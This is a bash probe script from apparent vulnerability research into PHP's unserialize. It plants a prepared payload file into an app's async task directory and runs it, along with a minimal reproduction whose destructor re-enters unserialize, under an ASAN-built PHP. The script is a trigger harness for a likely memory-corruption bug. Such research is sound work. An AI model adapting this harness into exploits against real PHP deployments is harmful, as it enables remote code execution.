#!/bin/bash
# Manual runner probe — find why runner.php flow doesn't fire vs vd1b shape.
LAB=$(cd "$(dirname "$0")" && pwd)
TASK=11111111-2222-3333-4444-555555555555
ASAN=/tmp/php8512_build/asan2/sapi/cli/php

mkdir -p "$LAB/storage/framework/async/payload"
cp /tmp/nphp_payload.bin "$LAB/storage/framework/async/payload/$TASK.task"

echo "=== A: my runner, ASAN + USE_ZEND_ALLOC=0 ==="
NATIVEPHP_TASK_ID=$TASK USE_ZEND_ALLOC=0 "$ASAN" -n "$LAB/runner.php" 2>&1 | head -8
echo "exit=$?"

echo
echo "=== B: vd1b-shape script that reads the payload from FILE (isolate file_get_contents/unlink/try) ==="
cat > /tmp/vd1b_file.php <<'EOF'
<?php
class AppCacheFlusher { public function __destruct() { unserialize('i:7;'); } }
$lab = getenv('NPHP_LAB');
$payload = file_get_contents($lab . '/storage/framework/async/payload/11111111-2222-3333-4444-555555555555.task');
@unlink($lab . '/storage/framework/async/payload/11111111-2222-3333-4444-555555555555.task');
echo "payload_len=" . strlen($payload) . "\n";
try {
    $work = unserialize($payload);
    echo "unserialize returned " . var_export($work !== false, true) . "\n";
    echo "SURVIVED\n";
} catch (Throwable $e) {
    echo "runner caught: " . $e->getMessage() . "\n";
}
EOF
cp /tmp/nphp_payload.bin "$LAB/storage/framework/async/payload/$TASK.task"
NPHP_LAB="$LAB" USE_ZEND_ALLOC=0 "$ASAN" -n /tmp/vd1b_file.php 2>&1 | head -8
echo "exit=$?"
